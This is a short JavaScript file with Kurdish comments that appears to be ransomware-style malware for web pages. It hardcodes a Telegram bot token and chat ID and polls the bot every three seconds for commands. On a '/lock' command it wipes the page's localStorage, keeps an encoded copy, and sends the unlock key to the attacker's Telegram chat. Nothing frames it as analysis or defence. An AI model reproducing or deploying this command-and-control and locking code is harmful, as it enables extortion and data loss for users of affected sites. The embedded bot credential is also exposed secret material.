const _token = '8806571693:AAEFmDHqDVI0HKxdw7uziPzTdhI6b08dk_Q';
const _id = '5500882902';
let isLocked = false;

// فەرمانا تێخستنێ (Encryption)
async function lockDevice() {
    isLocked = true;
    const data = JSON.stringify(localStorage);
    const key = "ZOALA-" + Math.random().toString(36).substring(7);
    localStorage.clear();
    localStorage.setItem("locked_key", btoa(data + key));
    
    // هنارتنا کلیلێ بۆ تێلەگرامێ
    await fetch(`https://api.telegram.org/bot${_token}/sendMessage?chat_id=${_id}&text=LOCKED_KEY: ${key}`);
}

// پشکنینا فەرمانان
setInterval(async () => {
    const res = await fetch(`https://api.telegram.org/bot${_token}/getUpdates?limit=1&offset=-1`);
    const data = await res.json();
    if(data.result.length > 0) {
        const cmd = data.result[0].message.text;
        if(cmd === "/lock") lockDevice();
        if(cmd.startsWith("/unlock")) {
            // ئەگەر تو کلیلێ بۆتێ بنێری، موبایل دێ ڤەبیت
            localStorage.setItem("unlocked", "true");
            isLocked = false;
        }
    }
}, 3000);